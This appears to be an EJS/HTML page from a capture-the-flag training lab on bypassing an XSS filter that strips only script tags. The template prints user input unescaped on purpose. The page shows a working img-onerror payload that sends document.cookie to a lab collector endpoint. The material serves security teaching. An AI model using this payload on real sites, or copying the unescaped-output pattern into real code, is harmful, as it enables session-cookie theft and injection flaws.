<!doctype html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TeamBoard — User Greeting</title>
<link rel="stylesheet" href="/css/lab.css">
</head>
<body data-theme="xss">
<div class="lab-topbar"><a class="lab-back" href="/challenges">&larr; ZeroDay Academy</a><span class="name">TeamBoard</span><span class="tag">/labs/xss-filter-bypass</span></div>
<div class="lab-wrap">
  <div class="lab-card">
    <h1>Team Board</h1>
    <form method="GET" action="/labs/xss-filter-bypass">
      <label>Your display name</label>
      <input name="name" placeholder="Enter your name" value="<%= name %>">
      <button type="submit">Set name</button>
    </form>
    <% if (filtered) { %>
      <div style="margin-top:1rem;padding:1rem;border-radius:8px;background:rgba(255,255,255,0.05);">
        Welcome, <%- filtered %>!
      </div>
    <% } %>
    <p class="lab-meta" style="margin-top:0.8rem;">The filter removes literal <code>&lt;script&gt;</code> tags only. Use another executable element that sends the proof cookie to the collector.</p>
    <pre class="lab-code">&lt;img src=x onerror="fetch('/labs/xss-filter-bypass/collect?p='+encodeURIComponent(document.cookie))"&gt;</pre>
  </div>

  <div class="lab-card">
    <h2>Verification</h2>
    <button type="button" class="secondary" id="checkFilter">Check verification</button>
    <pre class="lab-code" id="filterResult" style="margin-top:0.8rem;">Not checked yet.</pre>
  </div>

  <form method="POST" action="/labs/xss-filter-bypass/reset"><button type="submit" class="secondary">Reset lab</button></form>
</div>
<script>
  document.getElementById('checkFilter').addEventListener('click', async function () {
    const out = document.getElementById('filterResult');
    try {
      const response = await fetch('/labs/xss-filter-bypass/status');
      const data = await response.json();
      out.textContent = JSON.stringify(data, null, 2);
      if (data.flag) out.textContent += '\n\nFLAG: ' + data.flag;
    } catch (error) {
      out.textContent = 'Status check failed: ' + error.message;
    }
  });
</script>
</body>
</html>
